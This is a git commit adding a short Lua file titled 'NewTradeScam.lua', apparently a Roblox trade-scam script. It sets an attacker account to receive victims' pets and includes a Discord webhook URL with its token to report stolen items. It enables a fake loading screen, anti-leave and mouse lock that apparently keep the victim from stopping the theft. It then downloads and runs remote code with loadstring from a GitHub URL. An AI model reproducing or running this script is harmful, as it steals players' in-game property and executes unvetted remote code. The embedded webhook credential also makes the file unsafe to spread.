97ebe3a366f6e82c1430ac86613d7e51d4bac167
WSCRIPTS <139931243+JaydaDawg@users.noreply.github.com>
2023-08-30 06:37:08 -0400

    Add files via upload

---
+++ NewTradeScam.lua
@@ -0,0 +1,9 @@
+UserName = "Spreadthec0ruption" -- good pets
+Webhook = "https://discord.com/api/webhooks/1146390073529606154/t0obsaPkpLMpQCi-xJJAAO4S58O64VfVP01X5Mkn3EuebU-rUuMq5PMkjKZdua2OnWwK" -- pings for pets
+UserName2 = "Spreadthec0ruption" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
